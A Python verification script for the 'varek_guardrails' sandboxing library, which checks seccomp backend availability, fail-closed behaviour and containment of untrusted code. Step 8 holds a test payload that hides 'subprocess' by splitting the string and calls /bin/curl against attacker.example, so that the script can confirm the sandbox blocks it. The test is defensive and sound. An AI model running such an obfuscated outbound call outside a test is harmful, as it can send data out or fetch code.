"""
verify_guardrails.py — end-to-end verification of VAREK v1.1.1 guardrails.

Exercises every public entry point advertised in the CHANGELOG:
  1. Package imports resolve cleanly
  2. SeccompBpfBackend instantiates and reports availability correctly
  3. configure_backend fails closed when backend is unavailable
  4. configure_backend succeeds when backend is available
  5. subscribe_telemetry registers without error
  6. execute_untrusted refuses to run when no backend is configured
  7. execute_untrusted runs a benign payload under containment (if kernel supports it)
  8. execute_untrusted blocks a malicious payload at the kernel boundary

Each step prints PASS or SKIP with a clear reason. No step silently fails.
"""
import sys


def section(title):
    print(f"\n{'=' * 60}")
    print(f"  {title}")
    print('=' * 60)


def check(name, ok, detail=""):
    status = "PASS" if ok else "FAIL"
    marker = "✓" if ok else "✗"
    print(f"  [{status}] {marker} {name}")
    if detail:
        print(f"         {detail}")
    return ok


def skip(name, reason):
    print(f"  [SKIP] - {name}")
    print(f"         {reason}")


# -----------------------------------------------------------------
section("1. Package imports")
# -----------------------------------------------------------------
try:
    from varek_guardrails import (
        SeccompBpfBackend,
        ExecutionPayload,
        ExecutionPolicy,
        ExecutionOutcome,
        IsolationError,
        IsolationBackend,
        ResourceLimits,
        default_python_policy,
        configure_backend,
        execute_untrusted,
        subscribe_telemetry,
    )
    check("varek_guardrails exports all v1.1.1 names", True)
    import varek_guardrails
    version = getattr(varek_guardrails, "__version__", "unknown")
    check(f"varek_guardrails.__version__ == '1.1.1'", version == "1.1.1",
          f"actual: {version}")
except ImportError as e:
    check("varek_guardrails imports", False, f"ImportError: {e}")
    print("\nCannot continue. Fix imports first.")
    sys.exit(1)


# -----------------------------------------------------------------
section("2. SeccompBpfBackend instantiation")
# -----------------------------------------------------------------
backend = SeccompBpfBackend()
check("SeccompBpfBackend() instantiates", backend is not None)
check("backend is an IsolationBackend",
      isinstance(backend, IsolationBackend))

reason = backend.is_available()
backend_usable = (reason is None)
if backend_usable:
    check("backend.is_available() returns None (ready)", True)
else:
    print(f"  [INFO]   backend.is_available() returned: {reason!r}")
    print(f"  [INFO]   This is expected inside a codespace.")
    print(f"  [INFO]   Steps 4, 7, 8 will be skipped.")


# -----------------------------------------------------------------
section("3. configure_backend fails closed on unavailable backend")
# -----------------------------------------------------------------
class _FakeUnavailableBackend(IsolationBackend):
    """A test-only backend that always reports unavailable."""
    def name(self): return "fake_unavailable"
    def is_available(self): return "synthetic unavailability for testing"
    def execute(self, payload, policy):
        raise RuntimeError("should never reach execute()")

try:
    configure_backend(_FakeUnavailableBackend())
    check("configure_backend raises on unavailable backend", False,
          "expected IsolationError, got silent success (FAIL-OPEN BUG)")
except IsolationError as e:
    check("configure_backend raises IsolationError on unavailable backend",
          True, f"message: {e}")
except Exception as e:
    check("configure_backend raises correct exception type", False,
          f"expected IsolationError, got {type(e).__name__}: {e}")


# -----------------------------------------------------------------
section("4. configure_backend succeeds on available backend")
# -----------------------------------------------------------------
if backend_usable:
    try:
        configure_backend(backend)
        check("configure_backend(SeccompBpfBackend()) succeeds", True)
    except Exception as e:
        check("configure_backend on available backend", False,
              f"unexpected {type(e).__name__}: {e}")
else:
    skip("configure_backend on available backend",
         "SeccompBpfBackend reports unavailable in this environment")


# -----------------------------------------------------------------
section("5. subscribe_telemetry registers callbacks")
# -----------------------------------------------------------------
events_captured = []

def _capture(event, args):
    events_captured.append((event, args))

try:
    subscribe_telemetry(_capture)
    check("subscribe_telemetry accepts a callback", True)
except Exception as e:
    check("subscribe_telemetry registration", False,
          f"{type(e).__name__}: {e}")


# -----------------------------------------------------------------
section("6. execute_untrusted requires a configured backend")
# -----------------------------------------------------------------
# Reset the warden state so we can test the no-backend guard
import varek_warden as _warden_module
_saved_backend = _warden_module._active_backend
_warden_module._active_backend = None

try:
    execute_untrusted(
        ExecutionPayload(source="print('hi')", entrypoint="main", inputs={}),
        default_python_policy(),
    )
    check("execute_untrusted raises without configured backend", False,
          "expected IsolationError, got silent success (FAIL-OPEN BUG)")
except IsolationError as e:
    check("execute_untrusted raises IsolationError without backend",
          True, f"message: {e}")
except Exception as e:
    check("execute_untrusted raises correct exception type", False,
          f"expected IsolationError, got {type(e).__name__}: {e}")
finally:
    _warden_module._active_backend = _saved_backend


# -----------------------------------------------------------------
section("7. execute_untrusted runs a benign payload under containment")
# -----------------------------------------------------------------
if backend_usable:
    try:
        benign = ExecutionPayload(
            source="def main(): return 42",
            entrypoint="main",
            inputs={},
        )
        outcome = execute_untrusted(benign, default_python_policy())
        check("benign payload executes and returns", True,
              f"exit_code={outcome.exit_code}, "
              f"return_value={getattr(outcome, 'return_value', '?')}")
    except Exception as e:
        check("benign payload execution", False,
              f"{type(e).__name__}: {e}")
else:
    skip("benign payload execution",
         "SeccompBpfBackend unavailable — cannot exercise kernel boundary")


# -----------------------------------------------------------------
section("8. execute_untrusted blocks malicious payload")
# -----------------------------------------------------------------
if backend_usable:
    malicious = ExecutionPayload(
        source=(
            "def main():\n"
            "    __import__('subproc'+'ess').run(['/bin/curl',"
            " 'https://attacker.example'])\n"
            "    return 1.0\n"
        ),
        entrypoint="main",
        inputs={},
    )
    try:
        outcome = execute_untrusted(malicious, default_python_policy())
        check("malicious payload blocked at kernel boundary", False,
              f"payload returned without IsolationError "
              f"(exit_code={outcome.exit_code}) — kernel boundary failed")
    except IsolationError as e:
        check("malicious payload blocked at kernel boundary", True,
              f"syscall rejected: {getattr(e, 'syscall', 'unknown')}")
    except Exception as e:
        check("correct exception type on containment failure", False,
              f"expected IsolationError, got {type(e).__name__}: {e}")
else:
    skip("malicious payload kernel intercept",
         "SeccompBpfBackend unavailable — cannot exercise kernel boundary")


# -----------------------------------------------------------------
section("Summary")
# -----------------------------------------------------------------
print(f"  Telemetry events captured during run: {len(events_captured)}")
if events_captured:
    sample = events_captured[:3]
    for event, args in sample:
        print(f"    - {event}: {str(args)[:60]}")

print("\n  varek_guardrails v1.1.1 verification complete.\n")
